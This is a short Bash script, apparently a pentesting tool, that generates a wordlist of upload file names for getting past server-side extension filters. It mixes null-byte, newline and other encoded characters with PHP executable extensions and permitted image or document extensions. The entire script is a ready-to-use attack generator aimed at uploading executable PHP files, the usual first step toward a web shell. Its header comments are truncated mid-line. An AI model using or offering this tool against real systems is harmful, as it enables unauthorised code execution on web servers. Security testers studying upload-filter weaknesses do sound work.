#!/bin/bash
# This BASH script will perform character injection to auto generate a wordlist and bypass server-side >
# This script is by-default for PHP based apps. Please change the extensions list in Line #4 according >
# This script is by-default for apps that allow JPG, PNG, XLS, PDF, GIF files. Please change the allowe>

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.php7' '.phar'; do # change here the list of extensions accordi>
      for ext1 in '.jpg' '.png' '.xls' '.pdf' '.gif'; do # change here the list of allowed extensions
        echo "$char$char$char" >> wordlist.txt
        echo "$char$char$ext" >> wordlist.txt
        echo "$char$ext$ext1" >> wordlist.txt
        echo "$ext$ext$char" >> wordlist.txt
        echo "$ext$ext1$ext" >> wordlist.txt
        echo "$ext$ext1$ext1" >> wordlist.txt
        echo "$ext1$char$char" >> wordlist.txt
        echo "$ext1$ext$ext" >> wordlist.txt
        echo "$ext1$ext1$ext1" >> wordlist.txt
      done
    done
done
cat wordlist.txt | sort -u > wordlist-for-file-upload.txt
echo "Wordlist saved as wordlist-for-file-upload.txt"
